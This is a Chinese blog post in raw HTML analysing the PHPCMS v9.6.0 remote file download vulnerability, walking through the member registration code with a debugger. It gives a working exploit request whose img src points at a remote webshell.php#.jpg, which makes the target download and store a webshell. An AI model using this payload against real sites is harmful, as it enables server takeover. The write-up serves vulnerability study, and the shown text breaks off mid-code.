@@ -1,0 +1,1131 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="9I2ZJGCGSFZ3JOIR2o2ugq8lnm-NLadndUPsCsXXgFc" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="PHPCMSv9 任意文件下载" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="比较久的一个洞了，当时正好没啥时间看，今天突然想起来，那就翻出来分析一波把23333
+源码地址 https://github.com/pupiles/vulcms测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox漏洞url1http://localhost/install_package/index.php?m=member&amp;amp;c=index&amp;amp;a=reg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPCMSv9.6.0任意文件下载漏洞分析">
+<meta property="og:url" content="http://pupiles.com/phpcms.html">
+<meta property="og:site_name" content="Pupiles blog">
+<meta property="og:description" content="比较久的一个洞了，当时正好没啥时间看，今天突然想起来，那就翻出来分析一波把23333
+源码地址 https://github.com/pupiles/vulcms测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox漏洞url1http://localhost/install_package/index.php?m=member&amp;amp;c=index&amp;amp;a=reg">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms3.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms2.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms1.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms4.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms5.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms6.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms7.PNG">
+<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms8.PNG">
+<meta property="og:image" content="http://www.hackersb.cn/usr/uploads/2017/04/2465281435.jpg">
+<meta property="og:updated_time" content="2017-10-27T10:06:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPCMSv9.6.0任意文件下载漏洞分析">
+<meta name="twitter:description" content="比较久的一个洞了，当时正好没啥时间看，今天突然想起来，那就翻出来分析一波把23333
+源码地址 https://github.com/pupiles/vulcms测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox漏洞url1http://localhost/install_package/index.php?m=member&amp;amp;c=index&amp;amp;a=reg">
+<meta name="twitter:image" content="http://olgkg6ct5.bkt.clouddn.com/phpcms3.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pupiles.com/phpcms.html"/>
+
+
+
+
+
+  <title> PHPCMSv9.6.0任意文件下载漏洞分析 | Pupiles blog </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5cad5e7b7a8b5d3aea9f10d80c9f2b7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pupiles blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">菜的要死的程序猿和Web狗</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/phpcms.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                PHPCMSv9.6.0任意文件下载漏洞分析
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-27T15:32:22+08:00">
+                2017-10-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/phpcms.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/phpcms.html" class="leancloud_visitors" data-flag-title="PHPCMSv9.6.0任意文件下载漏洞分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>比较久的一个洞了，当时正好没啥时间看，今天突然想起来，那就翻出来分析一波把23333</p>
+<h3 id="源码地址-https-github-com-pupiles-vulcms"><a href="#源码地址-https-github-com-pupiles-vulcms" class="headerlink" title="源码地址 https://github.com/pupiles/vulcms"></a>源码地址 <a href="https://github.com/pupiles/vulcms" target="_blank" rel="external">https://github.com/pupiles/vulcms</a></h3><h3 id="测试环境PHPSTORM-XDEBUG-PHP5-4-firefox"><a href="#测试环境PHPSTORM-XDEBUG-PHP5-4-firefox" class="headerlink" title="测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox"></a>测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox</h3><h3 id="漏洞url"><a href="#漏洞url" class="headerlink" title="漏洞url"></a>漏洞url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</div></pre></td></tr></table></figure>
+<h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.pupiles.com/webshell/webshell.php#.jpg&gt;&amp;dosubmit=1</div></pre></td></tr></table></figure>
+<p>漏洞演示如下:<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms3.PNG" alt=""><br>然后会返回操作失败<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms2.PNG" alt=""><br>然而我们的webshell已经存放在目标站的upload下了<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms1.PNG" alt=""></p>
+<h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>首先我们看一下逻辑知道目标漏洞位于普通用户的注册逻辑处，那么按照一般MVC的尿性我们打开，应该在<code>modules=member&amp;&amp;method=register</code>处,于是我们就来到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phpcms/modules/member/index.php</div></pre></td></tr></table></figure></p>
+<p><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms4.PNG" alt=""><br>根据exp直接搜索<code>$_POST[&#39;info&#39;]</code>，来到130行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//附表信息验证 通过模型获取会员信息</span></div><div class="line">			<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</div><div class="line">				<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</div><div class="line">		        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</div><div class="line">				$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</div><div class="line">				$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</div><div class="line">				$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</div><div class="line">			&#125;</div></pre></td></tr></table></figure></p>
+<p>这里我们可以看到$_POST[‘info’]经过一个叫做array_map函数处理，也就是$_POST[‘info’]经过一个自定义的叫做<code>new_html_special_chars</code>的函数处理，我们拐进去看一下<code>(快捷键ctrl+b)</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	$encoding = <span class="string">'utf-8'</span>;</div><div class="line">	<span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>) $encoding = <span class="string">'gb2312'</span>;</div><div class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> htmlspecialchars($string,ENT_COMPAT,$encoding);</div><div class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>没啥特别的。就是把数组拆开，然后对每个值进行<code>htmlspecial</code>处理。<br>我们跳回去再看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>])</div></pre></td></tr></table></figure></p>
+<p>这里调用了$member_input类的get方法，而这个<code>$member_input</code>又是member_input类的一个对象。这里我想提一个题外话，注意一下实例化的时候传入了一个<code>$userinfo[&#39;modelid&#39;]</code>参数，这个参数其实就是我们exp中的<code>modelid=1</code>，这里这个参数其实对于此漏实并没有影响。然后我们来看一下我们的大头戏get方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</div><div class="line">		$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</div><div class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</div><div class="line"></div><div class="line">		$info = <span class="keyword">array</span>();</div><div class="line">		$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</div><div class="line">		<span class="keyword">if</span>(is_array($data)) &#123;</div><div class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</div><div class="line">				<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</div><div class="line">				$field = safe_replace($field);</div><div class="line">				$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</div><div class="line">				$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</div><div class="line">				$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</div><div class="line">				$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</div><div class="line">			 	$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</div><div class="line">				<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</div><div class="line">				$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</div><div class="line">				<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</div><div class="line">				<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</div><div class="line">				<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</div><div class="line">					showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					str_cut($value, $maxlength);</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</div><div class="line">	            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</div><div class="line">				$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</div><div class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</div><div class="line">	</div><div class="line">				$info[$field] = $value;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $info;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>代码balabala写的挺长的，不过我们这时候我们只需要提取一些关键部分的代码，像一些对于变量本身的值没有影响以及无关变量的代码就可以省去了，就跟做英语阅读理解一样。举个栗子，像这段代码中的变量赋值，以及对我们本身关注的变量<code>$value</code>没有影响的代码就可以省去了，精简完如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</div><div class="line">		$info = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">if</span>(is_array($data)) &#123;</div><div class="line">			$field = safe_replace($field);</div><div class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</div><div class="line">				$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</div><div class="line">				<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</div><div class="line">				$info[$field] = $value;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $info;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>这样代码就看起来就很容易理解了，好了回到正题。这里我们的<code>$data</code>也就是<code>$_POST[&#39;info&#39;]</code>显示经过了一个叫做trim_script的函数处理，我们依然拐进去看一下。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim_script</span><span class="params">($str)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span>(is_array($str))&#123;</div><div class="line">		<span class="keyword">foreach</span> ($str <span class="keyword">as</span> $key =&gt; $val)&#123;</div><div class="line">			$str[$key] = trim_script($val);</div><div class="line">		&#125;</div><div class="line"> 	&#125;<span class="keyword">else</span>&#123;</div><div class="line"> 		$str = preg_replace ( <span class="string">'/\&lt;([\/]?)script([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1script\\2&amp;gt;'</span>, $str );</div><div class="line">		$str = preg_replace ( <span class="string">'/\&lt;([\/]?)iframe([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1iframe\\2&amp;gt;'</span>, $str );</div><div class="line">		$str = preg_replace ( <span class="string">'/\&lt;([\/]?)frame([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1frame\\2&amp;gt;'</span>, $str );</div><div class="line">		$str = str_replace ( <span class="string">'javascript:'</span>, <span class="string">'javascript：'</span>, $str );</div><div class="line"> 	&#125;</div><div class="line">	<span class="keyword">return</span> $str;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>转义了一些特殊的标签，跟我们没啥关系，那我们就跳回来继续看。来到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$field = safe_replace($field);</div></pre></td></tr></table></figure></p>
+<p>依旧拐进去看一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    $string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">    <span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>把我们的payload的<code>&lt;</code>,<code>&gt;</code>替换成字符实体了，然而不管我们跳回来继续看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$func = $this-&gt;fields[$field][&apos;formtype&apos;];</div><div class="line">				if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);</div></pre></td></tr></table></figure></p>
+<p>这段代码大致的意思判断<code>$func</code>方法是否存在，如果存在，就用<code>$func</code>方法处理我们的关键变量<code>$value</code>，可是看到这里我相信很多同学都跟我有一样的疑问，<code>$this-&gt;fields</code>是什么?<br><code>$this-&gt;fields[$field]</code>又是什么?<code>$func</code>到底是神魔鬼啊?<br>这时候我们就要掏出神器<code>xdebug</code>来进行动态调试，先设个断点。<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms5.PNG" alt=""><br>接着调试页面，输入我们的exp，可以看到我们在断点处停下来了<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms6.PNG" alt=""><br>果断F7下一步<br><img src="http://olgkg6ct5.bkt.clouddn.com/phpcms7.PNG" alt=""><br>这里我们可以到$func的值为editor并且<code>content</code>跟我预测的一样，标签符被替换成了字符实体。<br>好了，既然我们知道了$func的值，那我们就去跳去本类下的editor方法处看看有没有什么惊喜吧。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</div><div class="line">		$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</div><div class="line">		$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</div><div class="line">		$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</div><div class="line">		$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</div><div class="line">		$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</div><div class="line">		<span class="keyword">return</span> $value;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>这里我们可以看到全场最关键的部分来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable);</div></pre></td></tr></table></figure></p>
+<p>这是什么?下载啊，赶紧跟进去看一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">global</span> $image_d;</div><div class="line">		<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</div><div class="line">		$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</div><div class="line">		<span class="keyword">$this</span>-&gt;field = $field;</div><div class="line">		$dir = date(<span class="string">'Y/md/'</span>);</div><div class="line">		$uploadpath = $upload_url.$dir;</div><div class="line">		$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</div><div class="line">		$string = new_stripslashes($value);</div><div class="line">		<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</div><div class="line">		$remotefileurls = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</div><div class="line">			dir_create($uploaddir);</div><div class="line">			$remotefileurls[$matche] = <span 